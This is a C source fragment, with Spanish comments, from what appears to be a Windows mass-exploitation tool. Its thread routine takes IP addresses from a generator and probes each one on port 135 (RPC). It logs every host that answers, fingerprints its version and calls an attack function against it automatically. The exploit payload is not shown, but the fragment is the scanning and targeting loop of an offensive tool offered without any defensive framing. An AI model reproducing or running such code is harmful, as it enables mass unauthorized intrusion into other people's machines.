void checkea(void *threadn)
{
	char ip[16];
	char ip2[17];
	int sock,i;
	struct sockaddr_in target_ip;
	fd_set fds;
	u_long tmp=1;
	struct timeval tv;


	EnterCriticalSection(&css);
	threads++;
	sleep(1);
	LeaveCriticalSection(&css);
	memset(ip,'\0',sizeof(ip));
	while (givemeip(ip)!=NULL)
	{
		//printf("Checkeando IP: %s\n",ip);
		target_ip.sin_family = AF_INET;
	   	target_ip.sin_addr.s_addr = inet_addr(ip);
                target_ip.sin_port = htons(135);
		closesocket(sock);
	    if ((sock=socket(AF_INET,SOCK_STREAM,0)) != -1)
	    {
			tmp=1;
			ioctlsocket( sock, FIONBIO, &tmp);
			tv.tv_sec = CONNECT;
			tv.tv_usec = 0;
			FD_ZERO(&fds);
			FD_SET(sock, &fds);

		    connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip));
		  if((i=select(sock+1,0,&fds,0,&tv))>0)
		    {
				sprintf(ip2,"%s\n",ip);
				EnterCriticalSection(&cslog);
				fputs(ip2,results);
				rpcopen++;
				LeaveCriticalSection(&cslog);
				attack(ip,version(ip,sock));


			}
		}
		closesocket(sock);
		memset(ip,'\0',sizeof(ip));
	}
	EnterCriticalSection(&css);
	threads--;
	sleep(1);
	LeaveCriticalSection(&css);
	//printf("Thread %i saliendo\n",(int)threadn);
	_endthread();

}

/******************************************************************************/

